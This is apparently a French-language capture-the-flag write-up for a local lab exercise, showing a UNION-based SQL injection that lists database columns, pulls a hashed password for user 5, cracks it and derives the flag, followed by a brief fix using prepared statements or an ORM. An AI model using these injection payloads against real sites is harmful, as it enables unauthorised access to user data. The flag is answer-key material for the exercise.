# SQL injection avancee

Cette exercice est similaire a la version `SQL injection basic`.

Depuis la page `members` (`http://localhost:8080/?page=member`) on a acces a un formulaire qui permet d'afficher le `firstname` et le `lastname` d'un utilisateur a partir de son ID.

La page fait certainement une requete toute simple du type:

        SELECT firstname, lastname FROM users WHERE id = $id

Ou `$id` en PHP pourrait etre $_GET['id'], par exemple, et donc on peut exploiter une faille de type `Injection SQL`.

En essayant diffrents ID, on trouve pour l'ID 5 la sortie suivante:

        ID: 5
        First name: Flag
        Surname : GetThe

On essaye donc d'injecter une requete pour recuperer la liste des tables:

        1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS

Et on obtient la sortie suivante:

        [...]

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : user_id

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : first_name

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : last_name

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : town

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : country

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : planet

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : Commentaire

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        First name: users
        Surname : countersign

        [...]

On en deduit qu'une table `users` existe avec les champs `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`.

Les champs `Commentaire` et `countersign` doivent probablement conternir le flag pour le membre d'ID 5.

On essaye d'injecter la requete suivante:

        1 OR 1 = 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5

Et on obtient la sortie suivante, qui contient le flag et l'instruction pour le dechiffrer:

        ID: 1 OR 1 = 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5
        First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
        Surname : 5ff9d0165b4f92b14994e5c685cdce28

Contrairement a la version `basic` de cette faille, on ne connait pas le type du hash qu'on a obtenu. On le met donc sur le site `https://www.tunnelsup.com/hash-analyzer/` et il nous indique que c'est un hash `md5`.

On le dechiffre via le site `https://www.dcode.fr/md5-hash` et on obtient: `FortyTwo`

On le met en lettres minuscules et on applique dessus l'algo `Sh256` via le site `https://www.sha256.fr/` pour obtenir le flag:

        10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Eviter cette faille

Pour eviter ce genre de faille, il suffirait de ne pas injecter directement l'ID dans la requete, d'utiliser des requetes preparees ou d'utilisers des ORM (object-relational mapping).
